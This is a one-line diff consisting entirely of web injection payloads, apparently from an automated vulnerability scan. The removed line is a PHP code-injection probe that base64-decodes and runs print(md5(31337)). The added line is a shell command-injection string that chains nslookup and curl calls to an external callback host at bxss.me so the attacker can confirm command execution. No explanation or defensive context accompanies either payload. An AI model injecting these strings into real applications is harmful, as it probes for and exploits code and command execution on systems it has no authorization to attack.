@@ -1,1 +1,1 @@
-;assert(base64_decode('cHJpbnQobWQ1KDMxMzM3KSk7'));
+;(nslookup -q=cname hitvbtgwubvww9bd35.bxss.me||curl hitvbtgwubvww9bd35.bxss.me)|(nslookup -q=cname hitvbtgwubvww9bd35.bxss.me||curl hitvbtgwubvww9bd35.bxss.me)&(nslookup -q=cname hitvbtgwubvww9bd35.bxss.me||curl hitvbtgwubvww9bd35.bxss.me)
